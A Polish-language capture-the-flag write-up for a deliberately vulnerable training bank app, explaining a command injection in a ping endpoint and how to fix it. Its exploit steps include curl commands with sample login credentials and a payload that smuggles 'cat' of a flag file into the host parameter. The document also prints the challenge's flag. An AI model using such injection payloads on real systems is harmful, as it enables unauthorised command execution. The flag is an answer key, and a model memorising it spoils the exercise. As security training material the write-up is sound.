# A13 - Command Injection

## Metadane
- **ID:** A13
- **Kategoria:** OWASP A03:2021
- **Trudnosc:** hard
- **Punkty:** 200
- **Flaga:** `PWR{c0mm4nd_1nj3ct10n_rce}`

## Opis
Panel diagnostyczny banku oferuje ping do adresu IP.
Endpoint `/api/challenges/a13/ping?host=` wstrzykuje wartosc
parametru bezposrednio do polecenia systemowego przez shell=True.

## Podatny endpoint
GET /api/challenges/a13/ping?host=

## Exploit krok po kroku
### Krok 1: Zaloguj sie i pobierz token JWT:
`curl -X POST http://localhost:5000/api/auth/login -H "Content-Type: application/json" -d "{\"email\":\"bob@vulnbank.pl\",\"password\":\"password123\"}"`

### Krok 2: Wywolaj setup zeby utworzyc plik z flaga:
`curl http://localhost:5000/api/challenges/a13/setup`

### Krok 3: Uzyj command injection zeby odczytac flage:
`curl "http://localhost:5000/api/challenges/a13/ping?host=127.0.0.1;cat /app/flag_rce.txt" -H "Authorization: Bearer TWOJ_TOKEN"`

### Krok 4: W polu output znajdziesz flage

## Jak to naprawic
Nigdy nie uzywac shell=True. Przekazywac argumenty jako liste:
subprocess.run(["ping", "-c", "1", host]) i walidowac input.

## Referencje
- https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html